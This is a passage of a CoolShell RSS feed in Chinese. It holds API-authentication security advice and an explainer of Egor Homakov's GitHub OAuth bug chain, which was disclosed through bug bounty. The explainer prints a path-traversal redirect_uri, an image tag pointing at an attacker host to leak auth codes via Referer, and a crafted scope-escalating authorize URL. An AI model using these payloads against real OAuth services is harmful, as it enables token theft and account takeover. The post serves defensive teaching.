+<h5>相关的注意事项</h5>
+<ul>
+<li>无论是哪种方式，我们都应该遵循HTTP的规范，把认证信息放在 <code>Authorization</code> HTTP 头中。</li>
+<li>不要使用GET的方式在URL中放入secret之类的东西，因为很多proxy或gateway的软件会把整个URL记在Access Log文件中。</li>
+<li>密钥Secret相当于Password，但他是用来加密的，最好不要在网络上传输，如果要传输，最好使用TLS/SSL的安全链路。</li>
+<li>HMAC中无论是MD5还是SHA1/SHA2，其计算都是非常快的，RSA的非对称加密是比较耗CPU的，尤其是要加密的字符串很长的时候。</li>
+<li>最好不要在程序中hard code 你的 Secret，因为在github上有很多黑客的软件在监视各种Secret，千万小心！这类的东西应该放在你的配置系统或是部署系统中，在程序启动时设置在配置文件或是环境变量中。</li>
+<li>使用AppID/AppSecret，还是使用OAuth1.0a，还是OAuth2.0，还是使用JWT，我个人建议使用TLS/SSL下的OAuth 2.0。</li>
+<li>密钥是需要被管理的，管理就是可以新增可以撤销，可以设置账户和相关的权限。最好密钥是可以被自动更换的。</li>
+<li>认证授权服务器（Authorization Server）和应用服务器（App Server）最好分开。</li>
+</ul>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21708.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-150x150.png" alt="网络数字身份认证术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21708.html" class="wp_rp_title">网络数字身份认证术</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/11021.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/02/Github-Security-150x150.png" alt="从“黑掉Github”学Web安全开发" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11021.html" class="wp_rp_title">从“黑掉Github”学Web安全开发</a></li><li ><a href="https://coolshell.cn/articles/21003.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/06/time-bomb-150x150.png" alt="计时攻击 Timing Attacks" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21003.html" class="wp_rp_title">计时攻击 Timing Attacks</a></li><li ><a href="https://coolshell.cn/articles/17607.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/MongoDB-150x150.jpg" alt="从 MongoDB “赎金事件” 看安全问题" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17607.html" class="wp_rp_title">从 MongoDB “赎金事件” 看安全问题</a></li><li ><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2015/04/phishing-1-150x150.jpg" alt="关于移动端的钓鱼式攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17066.html" class="wp_rp_title">关于移动端的钓鱼式攻击</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/19395.html">HTTP API 认证授权术</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/19395.html/feed</wfw:commentRss>
+			<slash:comments>70</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>从“黑掉Github”学Web安全开发</title>
+		<link>https://coolshell.cn/articles/11021.html</link>
+					<comments>https://coolshell.cn/articles/11021.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 10 Feb 2014 00:16:11 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[Gist]]></category>
+		<category><![CDATA[github]]></category>
+		<category><![CDATA[OAuth]]></category>
+		<category><![CDATA[Web]]></category>
+		<category><![CDATA[安全]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=11021</guid>
+
+					<description><![CDATA[<p>Egor Homakov（Twitter: @homakov 个人网站: EgorHomakov.com）是一个Web安全的布道士，他这两天把github给黑了...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/11021.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/11021.html">从“黑掉Github”学Web安全开发</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright" alt="" src="https://coolshell.cn/wp-content/uploads/2014/02/Github-Security.png" width="236" height="251" />Egor Homakov（Twitter: <a href="http://twitter.com/homakov">@homakov</a> 个人网站: <a href="http://egorhomakov.com/">EgorHomakov.com</a>）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《<a href="http://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html" target="_blank">How I hacked Github again</a>》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，<strong>我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕</strong>。关于Web开发中的安全事项，大家可以看看这篇文章《<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》</p>
+<h4>OAuth简介</h4>
+<p>首先，这个故事要从<a href="https://developer.github.com/v3/oauth/" target="_blank">Github OAuth</a>讲起。所以，我们需要先知道什么是<a href="http://en.wikipedia.org/wiki/OAuth" target="_blank">OAuth</a>。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。</p>
+<p><span id="more-11021"></span></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="aligncenter  wp-image-11022" alt="" src="https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication.png" width="630" height="375" srcset="https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication.png 700w, https://coolshell.cn/wp-content/uploads/2014/02/oauth-authentication-300x178.png 300w" sizes="(max-width: 630px) 100vw, 630px" /></p>
+<p style="text-align: left;">从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。</p>
+<h4 style="text-align: left;">OAuth的Callback</h4>
+<p>还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。</p>
+<p>你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。</p>
+<p>知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。</p>
+<h4>第一个Bug — 没有检查重定向URL中的/../</h4>
+<p>首先，我们通过<a href="https://developer.github.com/v3/oauth/#redirect-urls" target="_blank">Github的 redirect_uri 的说明文档</a>我们可以看到这样的说明：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">如果 CALLBACK URL是: http://example.com/path
+
+GOOD: https://example.com/path
+GOOD: http://example.com/path/subdir/other
+
+BAD: http://example.com/bar
+BAD: http://example.com/
+BAD: http://example.com:8080/path
+BAD: http://oauth.example.com:8080/path
+BAD: http://example.org</pre>
+<p>而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。</p>
+<p>但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。</p>
+<p>于是，Egor相当于构造了一个下面这样的Redirect URL：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE</pre>
+<p>于是上面的URL就相当于：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。</p>
+<h4>第二个BUG — 没有校验token</h4>
+<p>第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。</p>
+<p>这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。</p>
+<p>也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。</p>
+<h4>第三个BUG — 注入跨站图片</h4>
+<p>现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：</p>
+<pre>https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。</p>
+<p>到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：</p>
+<p>&lt;a href=http://hack.you.com/&gt;私人照片&lt;/a&gt;</p>
+<p>这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。</p>
+<p>但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。</p>
+<p>不过，我们可以用一个很诡异的技巧：</p>
+<p style="text-align: center;"><b>&lt;img src=&#8221;///attackersite.com&#8221;&gt;</b></p>
+<p>这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。</p>
+<h5>像程序员一样的思考</h5>
+<p>这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，</p>
+<ul>
+<li>对于绝对路径：你会匹配两个//，后面的可能会是 user@host.com（user@是可选的），然后可能会有:&lt;n&gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。</li>
+</ul>
+<ul>
+<li>对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。</li>
+</ul>
+<p>好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。</p>
+<p>但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：</p>
+<p style="text-align: center;"><a href="///www.google.com" target="_blank">CoolShell Test</a></p>
+<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;a href=&quot;///www.google.com&quot;&gt;CoolShell Test&lt;/a&gt;</code></p>
+<p>关键是，这个Chrome/Firefox的问题被标记成了Won&#8217;t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。</p>
+<p>于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。</p>
+<p>到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。</p>
+<h4>第四个bug &#8211; Gist把github_token放在了cookie里</h4>
+<p>于是Egor在用户的cookie里找到了 github_token</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-11030" alt="" src="https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie.png" width="395" height="47" srcset="https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie.png 395w, https://coolshell.cn/wp-content/uploads/2014/02/gist_cookie-300x35.png 300w" sizes="(max-width: 395px) 100vw, 395px" /></p>
+<p>但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》）。</p>
+<p>于是，Egor只能另谋出路。</p>
+<h4>第五个Bug &#8211; 自动给gist授权</h4>
+<p>因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）</p>
+<p style="word-wrap: break-word; padding: 10px 20px 20px 30px; background-color: #eee;">https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&amp;redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%<b>2Fcallback/../../../homakov/8820324</b>&amp;response_type=code&amp;<b>scope=repo,gists,user,delete_repo,notifications</b></p>
+<p>于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。</p>
+<h4> 其它 &amp; 感想</h4>
+<p>于是，作者从 <a href="https://bounty.github.com/">Github Security Bug Bounty</a> 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。</p>
+<p>下图是Github上的赏金猎手的排行榜（<a href="https://bounty.github.com/index.html#leaderboard" target="_blank">https://bounty.github.com/index.html#leaderboard</a>）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="aligncenter  wp-image-11053" alt="" src="https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard.jpg" width="580" height="478" srcset="https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard.jpg 716w, https://coolshell.cn/wp-content/uploads/2014/02/github_bounty_leaderboard-300x247.jpg 300w" sizes="(max-width: 580px) 100vw, 580px" /></p>
+<p>让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。<strong>老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率</strong>——你可以移步看看我写的《<a title="加班与效率" href="https://coolshell.cn/articles/10217.html" target="_blank">加班与效率</a>》</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/19395.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png" alt="HTTP API 认证授权术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19395.html" class="wp_rp_title">HTTP API 认证授权术</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li><li ><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="Web开发中需要了解的东西" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_title">Web开发中需要了解的东西</a></li><li ><a href="https://coolshell.cn/articles/5987.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" alt="如何设计“找回用户帐号”功能" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5987.html" class="wp_rp_title">如何设计“找回用户帐号”功能</a></li><li ><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="你会做Web上的用户登录功能吗？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5353.html" class="wp_rp_title">你会做Web上的用户登录功能吗？</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/11021.html">从“黑掉Github”学Web安全开发</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/11021.html/feed</wfw:commentRss>
+			<slash:comments>61</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
